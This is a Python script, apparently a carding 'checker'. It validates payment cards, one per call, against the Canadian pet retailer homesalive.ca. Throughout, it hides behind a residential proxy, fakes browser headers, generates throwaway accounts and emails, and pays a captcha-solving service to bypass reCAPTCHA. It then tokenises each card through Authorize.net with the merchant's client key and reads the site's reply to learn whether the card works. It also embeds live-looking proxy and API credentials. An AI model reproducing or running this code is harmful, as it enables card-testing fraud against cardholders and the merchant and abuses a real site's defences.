#=========================library==================================#
import requests , re , random , string , uuid , user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from colorama import Fore, Back, Style, init
from bs4 import BeautifulSoup
from nextcaptcha import NextCaptchaAPI 
import logging
from urllib.parse import unquote
import json
#=========================library==================================#

#Mero

#=============================toools===============================#
def Tele(ccx):
    ccx = ccx.strip().split('\n')[0]
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]

    if "20" in yy:
        yy = yy.split("20")[1]
    username = "pcZ9DikmY6-res-any"
    password = "PC_7q0GZZMMdvBLD388B"
    proxy = "proxy.rapidseedbox.com:5959"
    proxies = {
        "http": f"http://{username}:{password}@{proxy}",
        "https": f"http://{username}:{password}@{proxy}"
    }
    r = requests.Session()
    r.proxies.update(proxies)
    user = user_agent.generate_user_agent()
    def	 name():
        name = ''.join(random.choices(string.ascii_lowercase, k=6))	
        return f"{name}"	
    first = (name())
    last = (name())
    con = (name())
    def acc():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
        return f"{name}{number}@gmail.com"
    acc = (acc())
    GUID = uuid.uuid4()
    MUID = uuid.uuid4()
    SID = uuid.uuid4()
    init(autoreset=True)
    logging.basicConfig(level=logging.WARNING)
    logger = logging.getLogger()
    logger.setLevel(logging.WARNING)
    def solve_captcha():
        CLIENT_KEY = "next_539374b047cf9ef78193d8747719c4f2e4"
        WEBSITE_URL = "https://www.homesalive.ca/customer/account/createpost/"
        WEBSITE_KEY = "6LcuTOgUAAAAAOJeeyNRLiTzhCDVRvvksNegv9Gx"
        api = NextCaptchaAPI(client_key=CLIENT_KEY)
        result = api.recaptchav3(website_url=WEBSITE_URL, website_key=WEBSITE_KEY)
        # print(result.get('status'))
        if result.get('status') == 'ready' and 'solution' in result:
            # print(result['solution']['gRecaptchaResponse'])
            return result['solution']['gRecaptchaResponse']
        else:
            return None
    g_token = solve_captcha()
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'priority': 'u=0, i',
        'referer': 'https://www.homesalive.ca/customer/account/login/',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }

    response = r.get('https://www.homesalive.ca/customer/account/create/', headers=headers)
    soup = BeautifulSoup(response.content, 'html.parser')
    form_key = soup.find('input', attrs={'name':'form_key'})["value"]

    cookies = {'form_key': form_key}
    data = MultipartEncoder({
        'form_key': (None, form_key),
        'success_url': (None, ''),
        'error_url': (None, ''),
        'firstname': (None, 'Christa'),
        'lastname': (None, 'afadf'),
        'email': (None, acc),
        'newsletter_signup_method': (None, 'Customer Account Create'),
        'password': (None, 'spAEEz@qp3etwRn'),
        'password_confirmation': (None, 'spAEEz@qp3etwRn'),
        'g-recaptcha-response': (None, g_token),
    })
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': data.content_type,
        'origin': 'https://www.homesalive.ca',
        'priority': 'u=0, i',
        'referer': 'https://www.homesalive.ca/customer/account/create/',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }

    response = r.post('https://www.homesalive.ca/customer/account/createpost/', cookies=cookies, headers=headers, data=data)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'priority': 'u=0, i',
        'referer': 'https://www.homesalive.ca/customer/account/',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }

    response = r.get('https://www.homesalive.ca/customer/paymentinfo/', headers=headers)
    soup = BeautifulSoup(response.content, 'html.parser')
    form_key = soup.find('input', attrs={'name':'form_key'})["value"]

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json; charset=UTF-8',
        'Origin': 'https://www.homesalive.ca',
        'Referer': 'https://www.homesalive.ca/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': user,
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'securePaymentContainerRequest': {
            'merchantAuthentication': {
                'name': '3j6qJ43jFn',
                'clientKey': '25H9mmDkK3CMgQeFv2gn7Tn35F24pHA5E6Mz7pccEP5zC2hJV4s4qut563NvFNj8',
            },
            'data': {
                'type': 'TOKEN',
                'id': 'e07941ab-59e1-4bcc-b664-49bf4807b144',
                'token': {
                    'cardNumber': n,
                    'expirationDate': f'{mm}20{yy}',
                    #'cardCode': '000',
                },
            },
        },
    }

    response = requests.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)
    auth = re.search(r'"dataValue":"(.*?)"', response.text).group(1)
    cookies = {'form_key': form_key}
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.homesalive.ca',
        'priority': 'u=0, i',
        'referer': 'https://www.homesalive.ca/customer/paymentinfo/',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }

    data = {
        'form_key': form_key,
        'id': '',
        'method': 'authnetcim',
        'payment[acceptjs_key]': 'COMMON.ACCEPT.INAPP.PAYMENT',
        'payment[acceptjs_value]': auth,
        'payment[cc_last4]': '9854',
        'payment[cc_bin]': '421545',
        'billing[firstname]': 'Christa',
        'billing[lastname]': 'afadf',
        'billing[company]': '',
        'billing[telephone]': '9195157620',
        'billing[street][]': [
            '201 James St N',
            '1981 Jennifer Lane',
        ],
        'billing[city]': 'Hamilton',
        'billing[region_id]': '74',
        'billing[region]': '',
        'billing[postcode]': 'L8R 2L2',
        'billing[country_id]': 'CA',
        'payment[cc_type]': 'VI',
        'payment[cc_exp_month]': '6',
        'payment[cc_exp_year]': '2029',
        #'payment[cc_cid]': '000',
    }

    response = r.post('https://www.homesalive.ca/customer/paymentinfo/save/', cookies=cookies, headers=headers, data=data)
    mes = r.cookies.get_dict().get('mage-messages', '')
    text = unquote(mes)

    data = json.loads(text)

    for item in data:
        type_value = item.get('type', 'No type found')
        text_value = item.get('text', 'No text found')

        if text_value == "Thank you for registering with Homes Alive.":
            continue  

        return text_value
